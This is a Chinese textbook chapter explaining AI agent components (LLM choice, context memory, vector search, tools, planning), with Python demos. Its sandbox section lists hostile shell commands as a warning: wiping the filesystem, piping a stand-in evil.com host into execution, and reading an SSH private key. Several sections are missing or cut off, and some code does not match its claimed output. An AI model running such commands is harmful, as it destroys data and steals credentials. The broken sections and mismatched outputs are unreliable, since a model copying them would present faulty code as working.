第 3 章 Agent 的核心组件——大脑、记忆、工具、规划

“把一个 Agent 拆开看，里面其实就四样东西：一个会想问题的"大脑"（LLM）、一套"记忆"系统、一双能伸到外部世界的"手"（工具）、一个会拆任务的"项目经理"（规划）。这一章我们就把这四样东西拆开看，再拼起来做一个真正能跑的 Agent。”

图 3.1   Agent 四大件协作关系 —— 大脑居中调度，记忆、工具、规划环绕。

3.1 引子：拆开一个 Agent 看四件套

第 1 章我们讲了"Agent 是什么"——一个能在数字世界里自主完成多步任务的 AI。第 2 章我们讲了"Agent 怎么来的"——60 年的三次浪潮和一群关键人物。

从本章开始，我们要回答一个更工程化的问题：一个 Agent 到底由什么组成？

如果你去看 2024 年以后的任何主流 Agent 框架（LangGraph、AutoGen、CrewAI、Agno、OpenAI Agents SDK），把它们都拆开，里面都长这样：

        ┌──────────────────┐
        │   LLM 大脑       │  ← 思考 / 决策 / 生成
        └────────┬─────────┘
                 │
   ┌─────────────┼─────────────┐
   ▼             ▼             ▼
┌──────┐   ┌──────────┐   ┌──────────┐
│ 记忆 │   │   工具    │   │  规划    │
│Memory│   │  Tools   │   │ Planning │
└──────┘   └──────────┘   └──────────┘

为什么是这四件？

  • 大脑：Agent 的"思考者"。没有 LLM，就没有"智能"。
  • 记忆：Agent 的"笔记本"。没有记忆，Agent 就是金鱼——7 步前说过啥完全不记得。
  • 工具：Agent 的"手和脚"。LLM 本身不能发邮件、查天气、读写文件——这些都得靠工具。
  • 规划：Agent 的"项目经理"。面对"订机票 + 订酒店 + 安排接机"这种多步任务，得先拆、再做、再检查。

少了任何一件，Agent 都做不成真正的多步任务。这一章我们用 9 节讲完四件套，最后在 3.8 拼一个完整可跑的 Agent。

3.2 LLM 大脑——Agent 的"思考中枢"

LLM 是 Agent 唯一会"想问题"的部件。没有 LLM，Agent 就是个空壳。

3.2.1 模型选型：通用 / 推理 / 开源

2026 年的 LLM 市场大致分三类：

类型代表优势劣势适用场景
通用闭源GPT-4o / Claude Sonnet 4 / Gemini 2.5 Pro综合能力强、工具调用稳定贵、数据出云大多数 Agent 任务
推理模型OpenAI o3 / Claude Opus 4 (with thinking) / DeepSeek-R1数学、代码、规划强慢、贵、token 消耗大复杂多步推理
开源可自部署Llama 3.3 70B / Qwen 2.5 72B / Mistral Large 2数据不出云、可微调弱 30-50%、运维成本隐私敏感场景

经验法则：

  • 80% 的 Agent 任务用通用闭源（Claude Sonnet 4 或 GPT-4o）就够。
  • 任务涉及复杂规划（如 5 步以上推理、代码生成），加一个推理模型当"项目经理"。
  • 金融、医疗、政务这类强合规场景，优先开源 + 私有部署。

3.2.2 关键参数

import openai

response = openai.chat.completions.create(
    model="gpt-4o",           # 选哪个模型
    temperature=0.0,          # 创造性：0=确定，1=随机
    top_p=1.0,                # nucleus sampling（一般不动）
    max_tokens=2048,          # 最多生成多少 token
    frequency_penalty=0.0,    # 重复惩罚
    presence_penalty=0.0,     # 新话题奖励
    stop=["\n\n\n"],          # 停止符
)

Agent 场景下的推荐值：

参数推荐值为什么
temperature0.0 - 0.3工具调用要稳定，别让模型"发挥"
top_p1.0（默认）Agent 不需要截断采样

frequency_penalty0.0Agent 重复调用是合理的
stop视任务定比如工具调用后用 \nObservation: 停

3.3 短期记忆——Context Window

短期记忆就是当前对话的 context window。模型能看到的所有东西（系统提示 + 历史消息 + 工具调用结果）都装在这里。

3.3.1 Context Window 的本质

# 一个完整的 context 长这样
context = [
    {"role": "system", "content": "你是一个助理，能查天气。"},     # 系统提示
    {"role": "user", "content": "今天北京天气如何？"},              # 用户问题
    {"role": "assistant", "content": None,                         # Agent 决策
     "tool_calls": [{"function": {"name": "get_weather",
                                   "arguments": "{\"city\": \"北京\"}"}}]},
    {"role": "tool", "content": "{\"temp\": 25, "condition": "晴"}"}, # 工具返回
    {"role": "assistant", "content": "今天北京 25 度，晴天。"},     # Agent 回答
    {"role": "user", "content": "那明天呢？"},                      # 追问
    # ... 越来越多
]

问题：context 不是无限的。满了会怎样？

3.3.2 Context Overflow 演示

我们用 100 行 Python 模拟一下：

# context_overflow_demo.py
# 模拟 context 满了之后会发生什么

MAX_CONTEXT = 10  # 简化：只装 10 条消息

class SimpleAgent:
    def __init__(self, max_context=MAX_CONTEXT):
        self.max_context = max_context
        self.history = [
            {"role": "system", "content": "你是一个聊天 Agent。"}
        ]

    def add_message(self, msg):
        self.history.append(msg)
        # 关键：超出容量就丢最早的
        if len(self.history) > self.max_context:
            dropped = self.history[1]   # 永远保留 system
            self.history = [self.history[0]] + self.history[2:]
            print(f"  [警告] 丢弃消息: {dropped['role']} - {dropped['content'][:30]}")

    def reply(self, user_msg):
        self.add_message({"role": "user", "content": user_msg})
        # 假装是模型回答
        return f"我看到了 {len(self.history)-1} 条历史消息"

agent = SimpleAgent(max_context=4)
print(f"=== 模拟 context overflow（max={MAX_CONTEXT}）===")
for i in range(8):
    user_msg = f"消息 {i+1}"
    print(f"用户: {user_msg}")
    reply = agent.reply(user_msg)
    print(f"Agent: {reply}\n")

跑一下：

=== 模拟 context overflow（max=10）===
用户: 消息 1
Agent: 我看到了 1 条历史消息

用户: 消息 2
Agent: 我看到了 2 条历史消息

...（前 8 条都不丢）...

用户: 消息 9
Agent: 我看到了 9 条历史消息
  [警告] 丢弃消息: user - 消息 1

核心结论：context 满了，最早的消息会被丢。这意味着 Agent 会"忘记"很久以前说过的话。

3.3.3 三种应对策略

策略怎么做优点缺点
滑动窗口丢最早的 K 条简单早期重要信息丢失
摘要压缩让 LLM 把历史压缩成 200 字保留语义慢、贵、可能丢细节
分层缓存system + 关键事实 + 滑动窗口平衡实现复杂

2026 最佳实践：滑动窗口 + 关键事实外提。把用户的名字、偏好、任务目标提取到 system prompt 里，滑动窗口只放近期对话。

3.3.4 上下文压缩：4 种方法

滑动窗口会丢早期信息。要"丢而不漏"，需要压缩。常见 4 种方法：

方法思路优点缺点
截断（Truncation）只保留最近 N 条快早期全丢
摘要（Summarization）让 LLM 把历史压成 200 字保留语义慢、贵、可能丢细节
抽取（Extraction）让 LLM 抽"用户偏好"等关键事实精确需要写好 prompt
分层（Hierarchical）全局摘要 + 近期原文平衡实现复杂

生产推荐：摘要 + 抽取 + 滑动窗口组合——摘要压缩中间历史，抽取保留关键事实，滑动窗口保留最近 3-5 轮原文。

# context_compressor.py
# 演示摘要 + 抽取组合
# 离线 mock LLM

def mock_summarize(messages):
    """模拟 LLM 摘要。"""
    user_msgs = [m["content"] for m in messages if m.get("role") == "user"]
    return f"用户共提了 {len(user_msgs)} 个问题，主要关注 {user_msgs[0][:10] if user_msgs else '未知'}。"

def mock_extract(messages):
    """模拟 LLM 抽关键事实。"""
    facts = []
    for m in messages:
        if m.get("role") == "user":
            # 简化：抽取"我 X" 模式
            if "我喜欢" in m["content"] or "我要" in m["content"]:
                facts.append(m["content"])
    return facts

# 压缩策略
def compress_history(history, keep_recent=4):
    if len(history) <= keep_recent + 1:  # system + 少量
        return history
    # 1. system 提示保留
    system = history[0]
    # 2. 最近 N 条原文保留
    recent = history[-keep_recent:]
    # 3. 中间部分压缩
    middle = history[1:-keep_recent]
    summary = mock_summarize(middle)
    facts = mock_extract(middle)
    # 4. 拼回去
    return [
        system,
        {"role": "system", "content": f"[历史摘要] {summary}"},
        {"role": "system", "content": f"[关键事实] {'; '.join(facts) if facts else '无'}"},
        *recent
    ]

# 演示
history = [
    {"role": "system", "content": "你是一个助理。"},
    {"role": "user", "content": "我喜欢科幻小说"},
    {"role": "assistant", "content": "好的，记下了"},
    {"role": "user", "content": "今天天气怎么样"},
    {"role": "assistant", "content": "晴，25 度"},
    {"role": "user", "content": "明天呢"},
    {"role": "assistant", "content": "多云"},
    {"role": "user", "content": "适合去哪玩"},
    {"role": "assistant", "content": "推荐公园"},
]
compressed = compress_history(history, keep_recent=4)
print(f"原 {len(history)} 条 → 压 {len(compressed)} 条")
for m in compressed:
    print(f"  {m['role']}: {m['content'][:50]}")

跑一下可以看到：原 9 条消息被压到 6 条，但保留了 system 提示、关键事实（"我喜欢科幻小说"）、最近 4 条原文。

3.4 长期记忆——向量数据库 + 知识图谱

短期记忆装不下的东西（"1 年前用户说过啥"），就要进长期记忆。

3.4.1 Embedding：把文字变成数字

LLM 读的是 token，向量数据库存的是数字向量。

# embed_demo.py
# 用 sentence-transformers 把句子变成向量
# pip install sentence-transformers numpy
# 小贴士：bge-small-zh-v1.5 包体 ~100MB，笔记本也能跑；不要用 bge-large-zh-v1.5（~1.5GB）

from sentence_transformers import SentenceTransformer
import numpy as np

model = SentenceTransformer('BAAI/bge-small-zh-v1.5')  # 中文友好

sentences = [
    "北京今天晴，25 度",
    "上海今天多云，28 度",
    "北京明天有雨",
]

embeddings = model.encode(sentences)
print(f"向量维度: {embeddings.shape}")  # (3, 512)
print(f"第 0 条向量前 5 个数: {embeddings[0][:5]}")

# 计算相似度（cosine）
def cosine(a, b):
    return np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b))

print(f"'北京今天晴' vs '北京明天有雨': {cosine(embeddings[0], embeddings[2]):.3f}")
print(f"'北京今天晴' vs '上海今天多云': {cosine(embeddings[0], embeddings[1]):.3f}")
# 输出 0.85+ vs 0.6+ — 同一城市相似度更高

关键事实：

  • 语义相近的句子，向量距离近
  • 北京的两条 vs 北京/上海，相似度差异显著
  • 这就是"语义检索"的基础

3.4.2 向量数据库选型

库类型适用规模特点

pgvectorPostgres 扩展1M - 100M复用 PG 生态，事务支持好

  • 个人项目 / 原型：Chroma
  • 生产 + 已有 PG：pgvector
  • 生产 + 数据量大：Qdrant 或 Milvus
  • 不想运维：Pinecone

3.4.3 知识图谱：另一种长期记忆

向量数据库擅长"语义相似"检索，不擅长"实体关系"推理。比如：

  • "用户 A 是公司 B 的 CEO"
  • "公司 B 收购了公司 C"
  • "用户 A 喜欢用户 D"

这些"关系链"用向量检索会丢失。知识图谱就是为这种场景设计的。

// Neo4j Cypher 查询
MATCH (u:User {name: "张三"})-[:CEO_OF]->(c:Company)-[:ACQUIRED]->(target)
RETURN target.name

2025 年起流行的 GraphRAG（微软）就是用 LLM 自动从文本里抽实体关系，建图，再做 RAG。这是 3.4 的进阶话题，留到第 9 章再展开。

3.4.4 混合检索：向量 + 关键词

纯向量检索有一个问题——对专有名词、ID、缩写不敏感。比如用户搜"Q3 财报"，向量检索可能匹配到"季度报告"，但匹配不到"Q3"。

生产环境一般用混合检索（hybrid retrieval）：

# hybrid_retrieval.py
# 向量检索 + BM25 关键词检索 + 倒数排名融合（RRF）
# pip install rank-bm25 sentence-transformers numpy

from rank_bm25 import BM25Okapi
from sentence_transformers import SentenceTransformer
import numpy as np

class HybridRetriever:
    def __init__(self, docs):
        self.docs = docs
        # 1. BM25 关键词索引
        tokenized = [self._tokenize(d) for d in docs]
        self.bm25 = BM25Okapi(tokenized)
        # 2. 向量索引
        self.embedder = SentenceTransformer('BAAI/bge-small-zh-v1.5')
        self.doc_embeds = self.embedder.encode(docs)

    @staticmethod
    def _tokenize(text):
        # 简化版中文分词（生产环境用 jieba）
        return list(text)

    def search(self, query, top_k=3, alpha=0.5):
        """alpha 控制向量 vs 关键词的权重。"""
        # 1. BM25 分数
        bm25_scores = self.bm25.get_scores(self._tokenize(query))
        # 2. 向量相似度
        q_embed = self.embedder.encode([query])[0]
        vec_scores = np.dot(self.doc_embeds, q_embed) / (
            np.linalg.norm(self.doc_embeds, axis=1) * np.linalg.norm(q_embed)
        )
        # 3. 加权融合
        combined = alpha * vec_scores + (1 - alpha) * bm25_scores
        top_idx = np.argsort(combined)[::-1][:top_k]
        return [(self.docs[i], combined[i]) for i in top_idx]

# 演示
docs = [
    "Q3 财报营收增长 30%",
    "第三季度公司收入大幅提升",
    "iPhone 15 Pro Max 评测",
]
r = HybridRetriever(docs)
print(r.search("Q3 财报", top_k=2))
# 第一条 "Q3 财报" 排第一（BM25 命中关键词 + 向量相似）

RRF（Reciprocal Rank Fusion） 是更高级的融合方式——不直接加权分数，而是把两路排序的"倒数排名"加起来。Qdrant / Weaviate / Milvus 都内置了 RRF。

3.5 工具——Agent 的"手和脚"

LLM 本质是个只输出文字的程序。它不能发邮件、查天气、操作文件——这些都得靠工具。

3.5.1 工具的三大类

类型例子谁来执行
内置web_search、code_interpreter模型供应商
外部 APIget_weather(city)、send_email(to, subject)你的服务器
自定义query_database(sql)、read_file(path)你的代码

注意：内置工具（web_search）虽然好用，但内容不可控。生产环境一般用自定义工具 + 自己的 RAG 流水线。

3.5.2 工具描述的 4 个要点

每个工具要清楚地告诉 LLM：

{
  "name": "get_weather",                          // 1. 名字（动词开头）
  "description": "查询指定城市的当前天气",        // 2. 做什么、何时用
  "parameters": {                                 // 3. 参数（JSON Schema）
    "type": "object",
    "properties": {
      "city": {
        "type": "string",
        "description": "城市名，如 '北京'"
      }
    },
    "required": ["city"]
  },
  "returns": {                                    // 4. 返回结构
    "type": "object",
    "properties": {
      "temp": {"type": "number"},
      "condition": {"type": "string"}
    }
  }
}

关键：

  • description 决定 LLM 是否会选这个工具。写得不清，再好的工具也没人用。
  • parameters.description 决定 LLM 怎么填参数。比如 city 要不要带"市"字、温度单位用摄氏度还是华氏度——都得说清。
  • 不要把 50 个工具塞给 Agent。工具越多，模型选错的概率越大。单次 prompt 不超过 10-15 个工具。

3.5.3 安全沙箱

绝对不要给 Agent 系统的 shell 权限。Agent 拿到 shell 能干什么？

rm -rf /              # 删库
curl evil.com|x       # 远程执行
cat ~/.ssh/id_rsa      # 偷私钥

正确做法：

  1. 白名单工具：只暴露你写好的工具函数
  2. 超时 + 重试：每个工具调用限时 30s
  3. 资源配额：单次任务最多调用 10 个工具
  4. 审计日志：所有工具调用记到 log，方便事后追查

3.5.4 工具错误处理：4 类常见错误

工具调用失败时，Agent 看到的"错误"分四种，处理方式也不同：

错误类型例子应对
参数错误get_weather(city=) 缺 city反馈给 LLM，让它重填
网络错误HTTP 500 / 超时重试 1-2 次，失败后换工具
业务错误"用户余额不足"把业务错误传回 LLM，让它换方案
权限错误401 / 403立即停止任务，提示用户
 
# tool_error_handler.py
# 工具错误分类 + 重试逻辑

import time
import random

def execute_tool_with_retry(name, func, args, max_attempts=3):
    """带重试 + 错误分类的工具执行。"""
    last_error = None
    for attempt in range(max_attempts):
        try:
            return {"ok": True, "result": func(**args)}
        except PermissionError as e:
            # 权限错误不重试
            return {"ok": False, "error_type": "permission", "msg": str(e)}
        except (TimeoutError, ConnectionError) as e:
            # 网络错误重试
            last_error = e
            wait = 2 ** attempt + random.random()
            print(f"  [重试 {attempt+1}] 网络错误: {e}, {wait:.1f}s 后")
            time.sleep(wait)
        except TypeError as e:
            # 参数错误不重试（重试也没用）
            return {"ok": False, "error_type": "args", "msg": str(e)}
        except Exception as e:
            # 业务错误，不重试
            return {"ok": False, "error_type": "business", "msg": str(e)}
    return {"ok": False, "error_type": "network", "msg": f"重试 {max_attempts} 次后失败: {last_error}"}

关键：把错误结构化返回（error_type + msg），LLM 看到结构化错误能更好地决策。

3.6 规划——Agent 的"项目经理"

大脑有了、记忆有了、工具也有了——那"我该按什么顺序调用这些工具"呢？

这就是规划（Planning）的活。

3.6.1 为什么需要规划

假设用户说："帮我订明天去上海的机票和酒店"。一个没规划的 Agent 可能会这样：

轮 1: 调 search_flight() → 找到 5 个航班
轮 2: 调 book_hotel() → 报错：没指定城市
轮 3: 调 search_hotel() → 找到 20 个酒店
轮 4: 调 book_hotel() → 报错：没指定日期
...
（10 轮后才开始真正预订）

有规划的 Agent会这样：

[规划阶段]
目标: 订明天去上海的机票和酒店
子任务 1: 确认上海酒店位置偏好
子任务 2: 搜索明天到上海的航班
子任务 3: 搜索上海的酒店
子任务 4: 让用户选航班和酒店
子任务 5: 预订

[执行阶段]
执行子任务 1 → ...

效率提升 50%+。

3.6.2 三种规划范式

范式思路何时用
Plan-and-Execute一次生成完整计划，然后逐步执行任务可预测、步骤少（< 10 步）
ReAct边想边做，每步重新规划任务灵活、可能出错
Reflexion失败后反思，再重新规划任务易错、需要试错

详细对比留到第 5 章和第 10 章。本章只需知道：规划是 Agent 区别于 Chatbot 的关键能力。

3.6.3 规划器代码骨架

# planner.py
# 一个最小规划器

class Task:
    def __init__(self, name, deps=None, action=None):
        self.name = name
        self.deps = deps or []        # 依赖哪些子任务
        self.action = action          # 实际执行函数
        self.done = False
        self.result = None

class Planner:
    def __init__(self, llm_call):
        self.llm = llm_call
        self.tasks = []

    def plan(self, goal):
        """让 LLM 把目标拆成子任务。"""
        prompt = f"""把目标拆成子任务，每行一个，格式：- 任务名: 描述
目标: {goal}
子任务:"""
        response = self.llm(prompt)
        for line in response.strip().split("\n"):
            if ":" in line:
                name, desc = line.strip("- ").split(":", 1)
                self.tasks.append(Task(name=name.strip(), action=desc.strip()))

    def execute(self):
        """按依赖顺序执行所有任务。"""
        # 简化版：顺序执行
        results = {}
        for task in self.tasks:
            print(f"[执行] {task.name}: {task.action}")
            # 实际应该调工具
            task.result = f"<result of {task.name}>"
            task.done = True
            results[task.name] = task.result
        return results

# 演示
def mock_llm(prompt):
    if "订明天去上海的机票和酒店" in prompt:
        return """- 查航班: 搜索明天到上海的航班
- 查酒店: 搜索上海的酒店
- 用户选: 让用户选航班和酒店
- 预订: 提交订单"""
    return "- 任务1: 默认"

planner = Planner(llm_call=mock_llm)
planner.plan("订明天去上海的机票和酒店")
print("\n=== 执行 ===")
results = planner.execute()

3.7.1 协议总览

三大协议都遵循同样的"四步循环"：

┌──────────────────────────────────────────┐

│  2. LLM：决定要不要调、调哪个、传啥参数   │
│  3. 开发者：执行工具，把结果喂回 LLM      │

3.8 拼起来：一个最小可运行的 Python Agent

3.8.1 任务设定

用户问："今天北京天气如何？适合穿什么？"

Agent 要做的：

  1. 调 get_weather(city="北京") 查天气
  2. 根据温度 + 天气状况决定穿衣建议
  3. 用自然语言回答用户

3.8.2 完整代码

# minimal_agent.py
# 拼齐大脑 + 记忆 + 工具 + 规划 的最小 Agent
# 运行: python3 minimal_agent.py
# 不依赖任何 LLM API（用 mock LLM，方便离线跑）

import json
import re
from typing import List, Dict, Any

# ============================================================
# 1. 工具定义（Tools）
# ============================================================
TOOLS = [
    {
        "name": "get_weather",
        "description": "查询指定城市的当前天气。参数: city (城市名)",
        "parameters": {
            "type": "object",
            "properties": {"city": {"type": "string"}},
            "required": ["city"]
        }
    }
]

def get_weather(city: str) -> Dict[str, Any]:
    """真实场景应该调天气 API。这里用 mock 数据。"""
    mock_data = {
        "北京": {"temp": 25, "condition": "晴"},
        "上海": {"temp": 28, "condition": "多云"},
        "广州": {"temp": 32, "condition": "雷阵雨"},
    }
    return mock_data.get(city, {"temp": 20, "condition": "未知"})

TOOL_FUNCS = {"get_weather": get_weather}

# ============================================================
# 2. Mock LLM（离线可跑）
# ============================================================
def mock_llm(messages: List[Dict], tools: List = None) -> Dict:
    """模拟 LLM 的决策。真实场景换成 openai/Anthropic SDK。"""
    last_user = messages[-1]["content"]
    # 决策: 要不要调工具
    if "天气" in last_user and tools:
        # 提取城市
        m = re.search(r"([\u4e00-\u9fa5]{2,})", last_user)
        city = m.group(1) if m else "北京"
        return {
            "role": "assistant",
            "content": None,
            "tool_calls": [{
                "id": "call_1",
                "type": "function",
                "function": {
                    "name": "get_weather",
                    "arguments": json.dumps({"city": city}, ensure_ascii=False)
                }
            }]
        }
    # 否则: 直接回答
    return {"role": "assistant", "content": f"已为您查询，结果是 25 度晴。适合穿 T 恤。", "tool_calls": None}

# ============================================================
# 3. Agent 主循环
# ============================================================
class MinimalAgent:
    def __init__(self, llm_fn, tools, tool_funcs, max_steps=5):
        self.llm = llm_fn
        self.tools = tools
        self.tool_funcs = tool_funcs
        self.max_steps = max_steps
        # 短期记忆
        self.history = [
            {"role": "system", "content": "你是一个天气助手，能调 get_weather 工具。"}
        ]

    def _execute_tool(self, tool_call) -> str:
        """执行工具调用，返回 JSON 字符串。"""
        name = tool_call["function"]["name"]
        args = json.loads(tool_call["function"]["arguments"])
        print(f"  [工具调用] {name}({args})")
        result = self.tool_funcs[name](**args)
        return json.dumps(result, ensure_ascii=False)

    def run(self, user_msg: str) -> str:
        """Agent 主循环。"""
        self.history.append({"role": "user", "content": user_msg})
        for step in range(self.max_steps):
            print(f"\n--- 第 {step+1} 步 ---")
            print(f"  [历史消息数] {len(self.history)}")
            # 1. LLM 决策
            response = self.llm(self.history, self.tools)
            self.history.append(response)
            # 2. 如果要调工具
            if response.get("tool_calls"):
                for tool_call in response["tool_calls"]:
                    result = self._execute_tool(tool_call)
                    self.history.append({
                        "role": "tool",
                        "tool_call_id": tool_call["id"],
                        "content": result
                    })
                continue   # 继续循环
            # 3. 不调工具，返回最终回答
            return response.get("content", "")
        return "<超出最大步数>"

# ============================================================
# 4. 跑起来
# ============================================================
if __name__ == "__main__":
    agent = MinimalAgent(
        llm_fn=mock_llm,
        tools=TOOLS,
        tool_funcs=TOOL_FUNCS,
    )
    print("=" * 50)
    print("最小 Agent 演示")
    print("=" * 50)
    answer = agent.run("今天北京天气如何？适合穿什么？")
    print(f"\n=== 最终回答 ===\n{answer}")

3.8.4 调试 Agent 的 5 个常用技巧

Agent 是非确定性系统——同一个问题可能跑出不同结果。下面 5 个技巧能帮你 debug：

  1. 打印每一步的 LLM 输入输出—— 99% 的 bug 在这里
  2. 先固定 temperature=0——减少"玄学"问题
  3. 把 mock_llm 替换成真实 LLM 之前，先用 unit test 跑通 mock——避免一边写 LLM 逻辑一边写业务逻辑
  4. 限制 max_steps——避免 Agent 进入死循环把 token 烧光
  5. 记录 trace 到 JSON 文件——事后可以 replay
import json
from datetime import datetime

def trace_run(agent, user_msg, trace_file="trace.jsonl"):
    """把 Agent run 的每一步记到 JSONL。"""
    trace = {
        "ts": datetime.now().isoformat(),
        "user": user_msg,
        "steps": []
    }
    # 拦截 history 变化，记每步
    original_run = agent.run
    def traced_run(msg):
        agent.history.append({"role": "user", "content": msg})
        for step in range(agent.max_steps):
            trace["steps"].append({
                "step": step,
                "history_len": len(agent.history),
                "messages": [m.get("content") for m in agent.history[-3:]]
            })
        return original_run(msg)
    result = traced_run(user_msg)
    trace["result"] = result
    with open(trace_file, "a") as f:
        f.write(json.dumps(trace, ensure_ascii=False) + "\n")
    return result

3.9 进阶：让 Agent 跑得更稳

第 3.8 的 Agent 能跑，但生产环境会出各种问题。这一节讲 4 个最常见的"加固"手段。

3.9.1 重试与超时

import time
from functools import wraps

def retry(max_attempts=3, delay=1, backoff=2):
    """指数退避重试装饰器。"""
    def decorator(fn):
        @wraps(fn)
        def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try:
                    return fn(*args, **kwargs)
                except Exception as e:
                    if attempt == max_attempts - 1:
                        raise
                    wait = delay * (backoff ** attempt)
                    print(f"  [重试 {attempt+1}/{max_attempts}] {e}, {wait}s 后重试")
                    time.sleep(wait)
        return wrapper
    return decorator

@retry(max_attempts=3, delay=1)
def call_external_api():
    """可能失败的网络调用。"""
    # ... 实际代码
    pass

3.9.2 错误恢复

Agent 调工具失败时，别让整个任务崩。给它一个机会自我修复：

def safe_execute_tool(tool_call):
    try:
        return self._execute_tool(tool_call)
    except Exception as e:
        # 把错误信息喂回 LLM，让它决定怎么办
        return json.dumps({"error": str(e)})

LLM 看到错误，可能：

  • 重试时换参数
  • 选别的工具
  • 改计划

3.10.3 反模式

反模式为什么坏怎么做才对
把四大件全塞进 promptprompt 越长，模型越蠢prompt 只放"目标"和"输出格式"，其他靠代码
没有短期记忆管理context 爆炸滑动窗口 + 关键事实外提

没规划直接 ReAct效率低、token 费多步任务先规划再执行
没超时没重试一个工具卡死 = 整个 Agent 卡死每个工具加 timeout + retry
没 log出问题没法 debug每个 Agent run 留 trace

3.10.4 框架选型决策树

实际选框架时，按这个顺序问自己：

Q1: 你的目标语言是？
├── Python → 跳过 Q2
└── TypeScript / JavaScript → 略窄，LangGraph.js / Vercel AI SDK

Q2: 团队规模？
├── 1-2 人 → Agno / smolagents（轻量）

Q3: 任务复杂度？

3.11 本章小结

这一章我们把一个 Agent 拆成了四件套，又拼回去。8 条关键收获：

  1. 四大件：LLM 大脑 + 记忆 + 工具 + 规划，缺一不可。
  2. LLM 选型：80% 场景用 Claude Sonnet 4 / GPT-4o，复杂任务加推理模型（o3 / DeepSeek-R1）。
  3. 短期记忆：context window 满了会丢消息，需要滑动窗口 + 关键事实外提。
  4. 长期记忆：向量数据库做语义检索（Chroma / Qdrant / pgvector），知识图谱做关系推理（Neo4j）。
  5. 工具设计：description 决定 LLM 是否会选——写得越清，调用越准。
  6. 规划：多步任务先 Plan-and-Execute，灵活任务用 ReAct。
  7. 协议层：OpenAI / Anthropic / Gemini 的 Function Calling 结构相似，学一个通三个。
  8. 先自己写一遍 Agent，再上框架——理解原理比用工具重要。

关键概念摘要：

  • LLM 大脑 / 大模型选型 / 推理模型
  • Temperature / Top-p / Max tokens
  • Context window / 滑动窗口 / 摘要压缩
  • Embedding / 向量数据库 / 语义检索
  • 知识图谱 / GraphRAG
